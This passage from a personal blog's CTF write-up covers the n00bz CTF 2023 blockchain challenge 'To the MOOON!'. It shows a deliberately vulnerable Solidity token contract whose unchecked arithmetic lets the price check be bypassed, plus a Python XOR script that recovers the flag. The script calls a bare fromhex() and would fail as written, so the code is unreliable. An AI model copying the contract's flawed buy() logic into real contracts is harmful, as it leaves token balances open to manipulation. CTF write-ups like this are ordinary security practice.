<p>n00bz{M0dul0_f7w_1a4d3f5c!}</p>

<h3>Blockchain</h3>
<h5>To the MOOON!</h5>
<img class=img-fluid alt="n00bz CTF 2023" src=./images/blockchain/moon.png loading=lazy height="500" width="400">
<p>This was a weird challenge. It provided a solidity file. You have to exploit it to get the transaction hash which should be XORed with the given hex to get the flag. There are many flaws here, as TX hash depends on the number of the trancsactions from the address and the function. We can exploit this in many ways.</p>

<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sol" data-lang="sol">
<span style="color: aqua;">pragma</span> solidity <span style="color: aqua;">^0.6.0;</span>

<span style="color: aqua;">contract</span> <span style="color: lime;">TTMCoin</span> {
	<span style="color: aqua;">uint</span> public supply = <span style="color: lime;">10</span>;
	<span style="color: aqua;">uint</span> public price = <span style="color: lime;">10</span> <span style="color: lime;">Wei</span>;

	<span style="color: aqua;">string</span> public name = <span style="color: lime;">"To the Moon Coin"</span>;
    <span style="color: aqua;">string</span> public symbol = <span style="color: lime;">"TTMCOIN"</span>;
	<span style="color: aqua;">mapping</span> (<span style="color: aqua;">address</span> => <span style="color: aqua;">uint</span>) public balanceOf;

	<span style="color: aqua;">uint</span> priceToBeat = <span style="color: lime;">11</span> <span style="color: lime;">Wei</span>;
	<span style="color: aqua;">bool</span> public challIsSolved = <span style="color: aqua;">false</span>;

	<span style="color: aqua;">function</span> setPrice() public {
		price = supply * <span style="color: lime;">1</span> <span style="color: lime;">Wei</span>;
	}

	<span style="color: aqua;">function</span> buy(<span style="color: aqua;">uint</span> _amount) public <span style="color: aqua;">payable</span> {
		<span style="color: aqua;">require</span>(_amount <= supply, <span style="color: lime;">"If this prints, the purchase amount is greater than the supply!"</span>);
		
		<span style="color: aqua;">uint</span> _tokensBought = msg.value / price;
		balanceOf[msg.sender] += _tokensBought;
		supply -= _tokensBought;
	}

	<span style="color: aqua;">function</span> solve() public {
		<span style="color: aqua;">require</span>(price > priceToBeat, <span style="color: lime;">"You have... NOT gone to the moon"</span>);
		challIsSolved = <span style="color: aqua;">true</span>;
	}
}
</code></pre></div>
<p>The function buy() checks _amount &lt;= supply, but _tokensBought is taken from msg.value. So, If we pass amount 10 and msg.value 1000, It results in integer overflow. Now we can call the setPrice() function and solve() function to get the hash.</p>
<p>As I told there are many ways, just set the uint priceToBeat to 1 wei instead of 11 wei and now deploy and call the setPrice() function and solve() function to get the hash. It will be the same hash. As the contract is not deployed, we can just modify the contract. That is why I called it weird.</p>
<p>XOR the hash with the given hex:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
<span class="line"><span class="k">def</span> <span class="nf">xor_string_with_hex</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="n">hex_value</span><span class="p">):</span></span>
<span class="line">    <span class="c1"># Convert string to bytes</span></span>
<span class="line">    <span class="n">string_bytes</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span></span>
<span class="line"></span>
<span class="line">    <span class="c1"># Convert hex value to bytes</span></span>
<span class="line">    <span class="n">hex_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="nb">fromhex</span><span class="p">(</span><span class="n">hex_value</span><span class="p">))</span></span>
<span class="line"></span>
<span class="line">    <span class="c1"># XOR operation byte by byte</span></span>
<span class="line">    <span class="n">result_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">string_bytes</span><span class="p">,</span> <span class="n">hex_bytes</span><span class="p">))</span></span>
<span class="line"></span>
<span class="line">    <span class="c1"># Convert result bytes back to string</span></span>
<span class="line">    <span class="n">result_string</span> <span class="o">=</span> <span class="n">result_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span></span>
<span class="line"></span>
<span class="line">    <span class="k">return</span> <span class="n">result_string</span></span>
<span class="line"></span>
<span class="line"><span class="n">string_val</span> <span class="o">=</span> <span class="s1">"9a51d4efe2f23f207e48c5b0f7463d7349150059603809493ce1669e73cdbd94"</span></span>
<span class="line"><span class="n">hex_value</span> <span class="o">=</span> <span class="s1">"575105531e4f120e1c6d115d5d126d5d4e3a43590f59074439425a525616515f5b4e4c5b000057434d475b416f4e5b57473c0848694158095b56173b170a5d51"</span></span>
<span class="line"></span>
<span class="line"><span class="n">result</span> <span class="o">=</span> <span class="n">xor_string_with_hex</span><span class="p">(</span><span class="n">string_val</span><span class="p">,</span> <span class="n">hex_value</span><span class="p">)</span></span>
<span class="line"><span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span></span>
</code></pre></div>
<p>n00bz{why_wont_my_wallet_underflow}</p>


</div><hr /><div class="post-navs d-flex mb-3 justify-content-evenly">
  <div class="post-nav post-prev"><i class="fas fa-fw fa-chevron-left"></i>
    <a href="https://x0rc1ph3r.github.io/posts/umdctf2023/">UMDCTF Writeups
</a>
  </div></div><section class="related-posts-wrapper">
    <h3>Related Posts</h3>
    <ul class="related-posts"><li><a href="https://x0rc1ph3r.github.io/posts/invaderctf-writeups/">InvaderCTF Writeups
</a></li><li><a href="https://x0rc1ph3r.github.io/about/">About
</a></li></ul>
  </section></div>
    </article></div>
</div><aside class="col-lg-4 sidebar d-flex">
  <div class="container">
    
    <section class="card row text-center profile component">
  <div class="card-body">
    <div class="col-12 d-flex align-items-center justify-content-center"><img class="profile-avatar rounded-circle" alt="Farman Shaik" src="https://x0rc1ph3r.github.io/images/me.jpg" loading="lazy"
  
   />
</div>
    <div class="col-12 profile-meta"><div class="profile-name">Farman Shaik</div><div class="profile-bio"> Intrested about WEB 3.0 and Block Chain technologies</div><div class="profile-company"><i class="fas fa-fw fa-building"></i> ...</div><br /><div class="profile-location"><i class="fas fa-fw fa-map-marker-alt"></i> India</div><br /><div class="profile-about"><i class="fas fa-fw fa-user"></i><a href="https://x0rc1ph3r.github.io/about/"> About Me</a></div><br /></div>
  </div>
</section>
  <section class="recent-posts row card component">
  <div class="card-body">
    <h2 class="card-title">Recent Posts</h2>
    <ul><li><a href="https://x0rc1ph3r.github.io/posts/n00bz2023/">n00bz CTF
    </a></li><li><a href="https://x0rc1ph3r.github.io/posts/umdctf2023/">UMDCTF 2023
    </a></li><li><a href="https://x0rc1ph3r.github.io/posts/csaw_quals_2022/">CSAW Quals 2022
</a></li><li><a href="https://x0rc1ph3r.github.io/posts/invaderctf-writeups/">InvaderCTF Writeups
</a></li></ul>
  </div>
</section><section class="taxonomies row card component">
      <div class="card-body">
        <h2 class="card-title">
          <a href="https://x0rc1ph3r.github.io/categories">Categories</a>
        </h2>
        <div><a href="https://x0rc1ph3r.github.io/categories/ctf/" class="badge bg-primary text-white rounded post-taxonomy" title="CTF">
            CTF
          </a><a href="https://x0rc1ph3r.github.io/categories/security/" class="badge bg-primary text-white rounded post-taxonomy" title="Security">
            Security
          </a><a href="https://x0rc1ph3r.github.io/categories/writeups/" class="badge bg-primary text-white rounded post-taxonomy" title="WriteUps">
            WriteUps
          </a></div>
      </div>
    </section><section class="taxonomies row card component">
      <div class="card-body">
        <h2 class="card-title">
          <a href="https://x0rc1ph3r.github.io/tags">Tags</a>
        </h2>
        <div><a href="https://x0rc1ph3r.github.io/tags/misc/" class="badge bg-primary text-white rounded post-taxonomy" title="Misc">
            Misc
          </a><a href="https://x0rc1ph3r.github.io/tags/crypto/" class="badge bg-primary text-white rounded post-taxonomy" title="Crypto">
            Crypto
          </a></div>
      </div>
    </section>
    
  </div>
</aside>
</div>
    </main><footer class="footer mt-auto py-3 text-center container"><nav class="social-links nav my-2 justify-content-center">
      <a class="nav-link social-link" href="mailto:x0rc1ph3r@gmail.com" title="Email">
      <i class="fas fa-fw fa-2x fa-envelope"></i>
    </a><a class="nav-link social-link" target="_blank" href="https://github.com/farmansk" title="GitHub" rel="noopener noreferrer">
        <i class="fa-fw fa-2x fab fa-github"></i>
      </a><a class="nav-link social-link" target="_blank" href="https://www.linkedin.com/in/x0rc1ph3r" title="LinkedIn" rel="noopener noreferrer">
        <i class="fa-fw fa-2x fab fa-linkedin-in"></i>
      </a><a class="nav-link social-link" target="_blank" href="https://twitter.com/x0rc1ph3r" title="Twitter" rel="noopener noreferrer">
        <i class="fa-fw fa-2x fab fa-twitter"></i>
      </a><a class="nav-link social-link" target="_blank" href="https://x0rc1ph3r.github.io/farman" title="Website"
      rel="noopener noreferrer"><i class="fas fa-fw fa-2x fa-link"></i>
      </a></nav>
<div class="copyright mb-2">
  Copyright © 2022 Farman Shaik. All Rights Reserved.
</div>
</footer>
<script src="https://x0rc1ph3r.github.io/js/bundle.min.dfff1fab09c570894e719d1447ee731c8bb5a1e57e18d45beff274823da322f0.js" integrity="sha256-3/8fqwnFcIlOcZ0UR&#43;5zHIu1oeV&#43;GNRb7/J0gj2jIvA=" crossorigin="anonymous" defer></script><script defer src="https://x0rc1ph3r.github.io/js/viewer.min.2b366f6cb186c9ce6e41936589e36005bc87d36452602e9aea75f196009e8b95.js" integrity="sha256-KzZvbLGGyc5uQZNlieNgBbyH02RSYC6a6nXxlgCei5U=" crossorigin="anonymous"></script><script defer src="https://x0rc1ph3r.github.io/js/katex.min.affcdb0c3de1260e0074ae86bffee9280f85eb73debefdce021e5d030c262a17.js" integrity="sha256-r/zbDD3hJg4AdK6Gv/7pKA&#43;F63Pevv3OAh5dAwwmKhc=" crossorigin="anonymous"></script>
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-213801925-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

</body>
</html>